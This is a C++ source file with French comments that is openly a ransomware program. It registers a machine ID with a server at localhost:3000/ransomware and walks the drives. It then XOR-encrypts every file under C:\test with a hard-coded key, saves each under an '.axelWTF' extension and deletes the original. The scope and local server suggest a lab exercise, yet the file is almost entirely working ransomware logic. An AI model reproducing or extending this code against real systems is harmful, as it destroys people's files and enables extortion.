
#include <iostream>
#include <fstream>
#include <direct.h>
#include <filesystem>
#include <string>
#include <vector>
#include <winsock2.h>
#include <Windows.h>
#include <random>
#include <curl\curl.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

/*
 * Cette fonction permet de chiffrer un fichier en utilisant l'algorithme XOR avec une clé de 64 octets. Le fichier est chiffré en place, c'est à dire que le fichier d'entrée est écrasé par le fichier chiffré.
*/

void xor_encrypt(std::string path) {
    // J'initalise la clé de 64 octets
    char key[64];
    // std::string key_str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcde";
    std::string key_str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::copy(key_str.begin(), key_str.end(), key);

    // J'ouvre le fichier d'entrée en lecture binaire
    std::ifstream input{ path, std::ios::binary };

    std::filesystem::path output_path = std::filesystem::path(path).replace_extension(".axelWTF");

    // J'ouvre un fichier de sortie en écriture binaire
    std::ofstream output{ output_path, std::ios::binary };

    // J'initialise un tampon de 64 octets
    char buffer[64];
    // Tant que je peux lire 64 octets du fichier d'entrée je continue la boucle
    while (input.read(buffer, sizeof(buffer))) {
        //Je XOR le tampon avec la clé et je stocke le résultat dans le tampon
        for (int i = 0; i < 64; i++) {
            buffer[i] ^= key[i];
        }
        // J'écris le tampon dans le fichier de sortie. La méthode write prend en paramètre un pointeur vers le début du tampon et le nombre d'octets à écrire. La méthode gcount() retourne le nombre d'octets lus par la méthode read, contrairement à la méthode sizeof() qui retourne la taille du type de données passé en paramètre.
        output.write(buffer, input.gcount());
    }
    input.close();
    std::remove(path.c_str());
}

std::vector<std::string> getDrives() {
    using std::istringstream, std::getline, std::vector, std::string;

    vector<string> drives;

    std::random_device rd;
    std::string computerId = std::to_string(rd());
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, std::string("http://localhost:3000/ransomware?computer=" + computerId).c_str());
    std::string key;
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &key);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_perform(curl);

    std::cout << "key : " << key << std::endl;

    char buffer[MAX_PATH];
    DWORD length = GetLogicalDriveStringsA(MAX_PATH, buffer);

    if (length == 0) return drives;

    string drivesStr(buffer, length);
    istringstream ss(drivesStr);
    string drive;

    while (getline(ss, drive, '\0')) {
        if (drive.size() > 0) {
            drives.push_back(drive);
        }
    }
    return drives;
}

int main() {
    using std::cout, std::endl, std::vector, std::string;

    vector<string> drives = getDrives();

    for (auto drive : drives) {
        std::cout << drive << std::endl;
        for (auto& file : std::filesystem::recursive_directory_iterator("C:\\test", std::filesystem::directory_options::skip_permission_denied))
        {
            try {
                if (std::filesystem::is_directory(file)) {}
                else {
                    std::cout << file.path() << std::endl;
                    if (file.path().string().find(".axelWTF") == string::npos) {
                        xor_encrypt(file.path().string());
                    }
                }
            }
            catch (std::exception& e) {
                std::cout << e.what() << std::endl;
            }
        }
    }

    system("pause");
    return 0;
}